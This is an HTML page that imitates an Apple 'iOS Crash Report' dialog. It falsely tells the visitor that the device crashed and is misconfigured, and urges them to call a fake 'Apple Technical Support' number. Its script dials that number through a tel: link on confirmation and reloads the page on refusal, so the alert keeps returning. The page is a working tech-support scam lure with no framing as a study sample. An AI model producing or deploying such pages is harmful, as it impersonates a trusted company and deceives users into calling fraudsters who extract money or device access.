<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>iOS Crash Report</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f0f0f0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        .dialog {
            background: white;
            padding: 30px 20px;
            border-radius: 15px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 300px;
        }
        .dialog p {
            margin: 15px 0;
            font-size: 14px;
            color: #333;
        }
        .dialog b {
            font-weight: bold;
        }
        .button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #007AFF;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="dialog">
    <p><b>**** iOS Crash Report ****</b></p>
    <p>iOS crashed previously due to unwanted websites visit.</p>
    <p>There is a problem with the configuration of your <b>iOS</b>.</p>
    <p>Please call <b>Apple Technical Support</b> at <b>1-888-888-8888</b>.</p>
    <p>Click on OK, this will attempt to send a crash report to Apple.</p>
    <p>Call now: <b>1-888-888-8888</b></p>
    <button class="button" onclick="handleClick()">OK</button>
</div>

<script>
function handleClick() {
    const confirmCall = confirm("Do you want to call Apple Technical Support?");
    if (confirmCall) {
        window.location.href = "tel:18888888888";
    } else {
        location.reload();
    }
}
</script>

</body>
</html>
